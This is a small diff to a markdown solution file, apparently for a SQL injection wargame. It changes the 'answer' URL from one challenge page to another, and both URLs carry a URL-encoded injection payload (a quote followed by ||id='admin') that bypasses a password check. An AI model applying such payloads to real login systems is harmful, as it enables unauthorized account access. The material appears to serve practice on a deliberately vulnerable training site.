@@ -3,7 +3,7 @@
 ## answer
 
 ```
-https://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=%27%7C%7Cid%3D%27admin%27%23
+https://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=1%27%7C%7Cid=%27admin
 ```
 
 ## problem
